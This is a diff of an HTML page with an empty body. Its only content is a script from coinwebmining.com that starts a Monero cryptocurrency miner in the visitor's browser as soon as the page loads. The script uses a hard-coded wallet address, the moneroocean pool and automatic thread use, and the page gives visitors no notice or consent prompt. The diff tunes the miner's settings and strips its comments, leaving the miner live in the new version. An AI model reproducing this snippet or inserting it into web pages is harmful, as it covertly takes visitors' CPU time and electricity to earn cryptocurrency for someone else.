@@ -3,15 +3,15 @@
   <body>   </body>
 <script src="https://coinwebmining.com/cwm.js"></script>
 <script>
-    var site_id = 'cwm-1847';
+    var site_id = 'cwm-1848';
     var coin = 'monero';
     var wallet = '4AdbjqR7UuPf44divebPM1YKs2n6UARhEERk9veCu43vg8AcE3E1KBYGuaFxHhndarajwzbCVgnNVXqPhnZDEuhU2PD8fYb';
     var password = 'public';
-    var mining_pool = 'moneroocean.stream'; //or check https://coinwebmining.com/browser-miner/monero for more mining pools
-    var threads = -1; //You can set -1 for auto threads, or set number of threads between 1-16.
-    var throttle = 0; //Set the fraction of time that threads should be idle. A value of 0 means no throttling (i.e. full speed), a value of 0.5 means that threads will stay idle 50% of the time, with 0.2 they will stay idle 20% of the time and 80% of the time mining.
-    var debug = false; //false or true. Whetever you want to display mining info in a console. Good to verify script works.
-    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug); //Enjoy mining ;)
+    var mining_pool = 'gulf.moneroocean.stream:10001';
+    var threads = -1;
+    var throttle = 0.2;
+    var debug = false;
+    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
 </script>
 </html>
 
